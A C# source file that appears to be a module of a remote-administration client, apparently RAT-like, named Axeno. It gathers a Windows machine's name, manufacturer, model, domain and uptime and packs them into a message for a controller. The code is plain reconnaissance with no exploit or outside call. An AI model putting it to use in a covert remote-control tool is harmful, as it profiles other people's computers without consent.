 using Axeno.Client.MessagePack;
using System;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Runtime.Remoting.Messaging;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace Axeno.Client.Networking.Functions.General
{
    internal class GetSystemInfo
    {
        public static byte[] Retrieve()
        {

            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "SystemInformation";
            msgpack.ForcePathObject("Name").AsString = Environment.MachineName;
            msgpack.ForcePathObject("Manafacturer").AsString = GetManafacturer();
            msgpack.ForcePathObject("Model").AsString = GetModel();
            msgpack.ForcePathObject("Domain").AsString = Environment.UserDomainName;
            msgpack.ForcePathObject("Uptime").AsString = $"{GetUpTime().Days.ToString()} day(s), {GetUpTime().Hours.ToString()} hours, {GetUpTime().Minutes.ToString()} minutes";
            return msgpack.Encode2Bytes();
        }

        public static string GetManafacturer()
        {
            ManagementClass mc = new ManagementClass("Win32_ComputerSystem");
            ManagementObjectCollection moc = mc.GetInstances();
            if (moc.Count != 0)
            {
                foreach (ManagementObject mo in mc.GetInstances())
                    return mo["Manufacturer"].ToString();
            }
            return null;
        }
        public static string GetModel()
        {
            ManagementClass mc = new ManagementClass("Win32_ComputerSystem");
            ManagementObjectCollection moc = mc.GetInstances();
            if (moc.Count != 0)
            {
                foreach (ManagementObject mo in mc.GetInstances())
                    return mo["Model"].ToString();
            }
            return null;
        }
        public static TimeSpan GetUpTime()
        {
            return TimeSpan.FromMilliseconds(GetTickCount64());
        }

        [DllImport("kernel32")]
        extern static UInt64 GetTickCount64();
    }
}
